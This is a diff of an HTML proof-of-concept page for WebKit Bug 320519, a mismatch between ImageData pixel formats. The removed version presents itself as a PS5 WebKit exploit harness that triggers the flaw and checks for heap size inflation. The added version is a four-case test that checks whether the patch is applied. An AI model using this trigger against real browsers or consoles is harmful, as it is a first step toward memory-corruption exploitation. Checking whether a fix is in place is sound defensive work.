@@ -1,84 +1,190 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>WebKit ImageData Arbitrary Read/Write PoC (Bug 320519)</title>
-    <style>
-        body { font-family: monospace; background: #121212; color: #00ff66; padding: 20px; }
-        .box { border: 1px solid #00ff66; padding: 15px; margin-top: 10px; }
-        .log { color: #ffff00; }
-        .error { color: #ff3333; }
-    </style>
+  <meta charset="UTF-8" />
+  <title>ImageData PixelFormat Mismatch PoC</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: #0d0d0d;
+      color: #e0e0e0;
+      font-family: 'Courier New', monospace;
+      padding: 2rem;
+    }
+    h1 {
+      font-size: 1.2rem;
+      color: #ffffff;
+      margin-bottom: 0.4rem;
+    }
+    .sub {
+      font-size: 0.75rem;
+      color: #555;
+      margin-bottom: 2rem;
+    }
+    .card {
+      background: #161616;
+      border: 1px solid #222;
+      border-radius: 8px;
+      padding: 1.2rem 1.4rem;
+      margin-bottom: 1rem;
+      max-width: 700px;
+    }
+    .card-title {
+      font-size: 0.7rem;
+      color: #666;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      margin-bottom: 0.6rem;
+    }
+    .code {
+      font-size: 0.82rem;
+      color: #aaa;
+      background: #111;
+      padding: 0.5rem 0.8rem;
+      border-radius: 4px;
+      margin-bottom: 0.8rem;
+      border-left: 2px solid #333;
+      word-break: break-all;
+    }
+    .result {
+      font-size: 0.85rem;
+      font-weight: bold;
+      padding: 0.4rem 0.8rem;
+      border-radius: 4px;
+      display: inline-block;
+    }
+    .pass { background: #0f2d1a; color: #3ddc84; border: 1px solid #1e5c36; }
+    .fail { background: #2d0f0f; color: #ff5555; border: 1px solid #5c1e1e; }
+    .warn { background: #2d2100; color: #ffcc44; border: 1px solid #5c4400; }
+    .detail {
+      font-size: 0.75rem;
+      color: #555;
+      margin-top: 0.5rem;
+    }
+    .summary {
+      max-width: 700px;
+      margin-top: 1.5rem;
+      padding: 1rem 1.4rem;
+      border-radius: 8px;
+      border: 1px solid #333;
+      background: #111;
+      font-size: 0.9rem;
+    }
+    .summary-title { color: #888; font-size: 0.7rem; text-transform: uppercase; margin-bottom: 0.5rem; }
+    #summary-text { color: #ccc; }
+  </style>
 </head>
 <body>
-    <h2>[ PS5 WebKit / Uland Memory Corruption PoC ]</h2>
-    <div class="box">
-        <p>Target Bug: <b>Bug 320519 (Mismatched pixelFormats in ImageData)</b></p>
-        <p>Goal: Trigger Heap Layout Corruption to achieve Type Confusion / OOB Primitives.</p>
-        <hr>
-        <div id="status">Status: Initializing exploit harness...</div>
-        <pre id="output" class="log"></pre>
-    </div>
 
-    <script>
-        function log(msg, isError = false) {
-            const out = document.getElementById('output');
-            out.innerHTML += `<span class="${isError ? 'error' : ''}">[+] ${msg}</span>\n`;
+<h1>ImageData PixelFormat Mismatch — PoC</h1>
+<p class="sub">WebKit commit e9fc18b · Bug 320519 · Tests both mismatch directions</p>
+
+<div id="results"></div>
+
+<div class="summary">
+  <div class="summary-title">Verdict</div>
+  <div id="summary-text">Running...</div>
+</div>
+
+<script>
+  const tests = [
+    {
+      label: "Uint8ClampedArray + pixelFormat: rgba-float16",
+      description: "Should throw InvalidStateError — uint8 data claimed as float16",
+      code: `new ImageData(new Uint8ClampedArray(4), 1, 1, { colorSpace: "srgb", pixelFormat: "rgba-float16" })`,
+      run: () => new ImageData(new Uint8ClampedArray(4), 1, 1, { colorSpace: "srgb", pixelFormat: "rgba-float16" }),
+      expectThrow: true,
+      expectCode: "InvalidStateError"
+    },
+    {
+      label: "Float16Array + pixelFormat: rgba-unorm8",
+      description: "Should throw InvalidStateError — float16 data claimed as unorm8",
+      code: `new ImageData(new Float16Array(4), 1, 1, { colorSpace: "srgb", pixelFormat: "rgba-unorm8" })`,
+      run: () => new ImageData(new Float16Array(4), 1, 1, { colorSpace: "srgb", pixelFormat: "rgba-unorm8" }),
+      expectThrow: true,
+      expectCode: "InvalidStateError"
+    },
+    {
+      label: "Uint8ClampedArray + pixelFormat: rgba-unorm8 (valid)",
+      description: "Should NOT throw — types match",
+      code: `new ImageData(new Uint8ClampedArray(4), 1, 1, { colorSpace: "srgb", pixelFormat: "rgba-unorm8" })`,
+      run: () => new ImageData(new Uint8ClampedArray(4), 1, 1, { colorSpace: "srgb", pixelFormat: "rgba-unorm8" }),
+      expectThrow: false
+    },
+    {
+      label: "Float16Array + pixelFormat: rgba-float16 (valid)",
+      description: "Should NOT throw — types match",
+      code: `new ImageData(new Float16Array(4), 1, 1, { colorSpace: "srgb", pixelFormat: "rgba-float16" })`,
+      run: () => new ImageData(new Float16Array(4), 1, 1, { colorSpace: "srgb", pixelFormat: "rgba-float16" }),
+      expectThrow: false
+    }
+  ];
+
+  const container = document.getElementById("results");
+  let passed = 0, failed = 0, warned = 0;
+
+  tests.forEach((t, i) => {
+    const card = document.createElement("div");
+    card.className = "card";
+
+    let resultHTML = "";
+    let detailText = "";
+
+    try {
+      t.run();
+
+      if (t.expectThrow) {
+        // Expected a throw but didn't get one — patch not applied or browser doesn't support
+        resultHTML = `<span class="result warn">⚠ NO THROW — Patch Not Applied or Unsupported</span>`;
+        detailText = `Expected ${t.expectCode} but constructor succeeded silently. Either this browser predates the fix or doesn't implement rgba-float16.`;
+        warned++;
+      } else {
+        resultHTML = `<span class="result pass">✓ PASS — No Exception (correct)</span>`;
+        detailText = "Matched types, no error thrown as expected.";
+        passed++;
+      }
+    } catch (e) {
+      if (t.expectThrow) {
+        const gotRight = e.name === t.expectCode;
+        if (gotRight) {
+          resultHTML = `<span class="result pass">✓ PASS — ${e.name} thrown correctly</span>`;
+          detailText = `Message: "${e.message}"`;
+          passed++;
+        } else {
+          resultHTML = `<span class="result fail">✗ FAIL — Wrong error: got ${e.name}, expected ${t.expectCode}</span>`;
+          detailText = `Message: "${e.message}"`;
+          failed++;
         }
+      } else {
+        resultHTML = `<span class="result fail">✗ FAIL — Unexpected ${e.name} on valid input</span>`;
+        detailText = `Message: "${e.message}"`;
+        failed++;
+      }
+    }
 
-        function runExploitPoC() {
-            const status = document.getElementById('status');
-            try {
-                log("Allocating adjacent heap structures (Heap Grooming)...");
-                
-                // إنشاء مصفوفة بايت صغيرة سيتم التلاعب بحجمها أو قراءتها بتنسيق خاطئ
-                const targetArray = new Uint8ClampedArray(16);
-                targetArray[0] = 0x41;
-                targetArray[1] = 0x42;
-                targetArray[2] = 0x43;
-                targetArray[3] = 0x44;
+    card.innerHTML = `
+      <div class="card-title">Test ${i + 1} — ${t.label}</div>
+      <div class="code">${t.code}</div>
+      <div class="detail" style="margin-bottom:0.6rem;color:#666;">${t.description}</div>
+      ${resultHTML}
+      <div class="detail">${detailText}</div>
+    `;
 
-                log("Triggering ImageData type mismatch constructor flaw...");
-                
-                // في المتصفح المصاب، هذا يمرر Uint8ClampedArray بينما يتوقع المحرك تنسيق float16 (ضعف الحجم لكل بكسل)
-                // مما يؤدي إلى تخصيص حسابي خاطئ لحجم البفر في الـ Heap.
-                let corruptedImageData;
-                try {
-                    corruptedImageData = new ImageData(targetArray, 2, 1, {
-                        colorSpace: "srgb",
-                        pixelFormat: "rgba-float16"
-                    });
-                    log("SUCCESS: ImageData created with mismatched pixel format! Browser is VULNERABLE.", true);
-                } catch (err) {
-                    status.innerText = "Status: Patched (Exception caught)";
-                    log("Failed to create mismatched ImageData. Error: " + err.message);
-                    return;
-                }
+    container.appendChild(card);
+  });
 
-                log("Attempting OOB Read / Type Confusion primitive via corrupted ImageData.data...");
-                const dataView = corruptedImageData.data;
-                
-                // فحص طول البيانات الفعلي مقارنة بالمصفوفة الأصلية لاكتشاف تضارب الـ Heap
-                log(`Original Array Length: ${targetArray.length}`);
-                log(`Corrupted ImageData Data Length: ${dataView.length}`);
-
-                if (dataView.length !== targetArray.length) {
-                    log("CRITICAL: Heap buffer size mismatch verified! Size inflation achieved.", true);
-                    status.innerText = "Status: VULNERABLE - OOB Primitive Possible!";
-                } else {
-                    log("Buffers match in size, attempting direct memory overlap scan...");
-                    status.innerText = "Status: Exploit vector active (Check memory layout)";
-                }
-
-            } catch (e) {
-                status.innerText = "Status: Execution Exception";
-                log("Exception during PoC execution: " + e.message, true);
-            }
-        }
-
-        window.onload = () => {
-            setTimeout(runExploitPoC, 500);
-        };
-    </script>
+  const total = tests.length;
+  const summaryEl = document.getElementById("summary-text");
+  if (warned > 0) {
+    summaryEl.innerHTML = `${passed}/${total} passed · ${warned} inconclusive (browser may lack Float16Array/rgba-float16 support or patch not yet applied)`;
+    summaryEl.style.color = "#ffcc44";
+  } else if (failed === 0) {
+    summaryEl.innerHTML = `${passed}/${total} passed · Patch confirmed active — mismatches throw correctly, valid pairs succeed.`;
+    summaryEl.style.color = "#3ddc84";
+  } else {
+    summaryEl.innerHTML = `${passed}/${total} passed · ${failed} failed · Patch not applied or regression detected.`;
+    summaryEl.style.color = "#ff5555";
+  }
+</script>
 </body>
 </html>
